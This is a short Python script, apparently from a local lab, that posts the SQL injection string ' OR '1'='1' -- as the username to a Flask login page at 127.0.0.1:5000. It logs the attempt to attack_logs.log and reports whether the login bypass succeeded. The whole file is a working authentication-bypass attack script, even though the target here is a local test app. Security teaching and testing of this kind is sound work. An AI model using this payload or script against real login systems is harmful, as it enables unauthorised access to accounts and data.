import requests
import os
import logging

# Create logs directory
log_dir = "logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Configure logging
logging.basicConfig(
    filename=os.path.join(log_dir, "attack_logs.log"),
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# URL of the Flask login page
url = 'http://127.0.0.1:5000/'

# SQL Injection payload
payload = {
    'username': "' OR '1'='1' --",  # Injection payload for SQLite
    'password': ''
}

logging.info("Starting SQL Injection attack...")
logging.info(f"Payload sent: {payload}")

try:
    response = requests.post(url, data=payload)
    if "SQL Injection Successful!" in response.text or "Login Successful!" in response.text:
        logging.info("SQL Injection attack successful!")
        print("SQL Injection Successful!")
    else:
        logging.warning("SQL Injection attack failed.")
        print("SQL Injection Failed!")
except requests.exceptions.RequestException as e:
    logging.error(f"Attack failed: {e}")
    print(f"Attack failed: {e}")
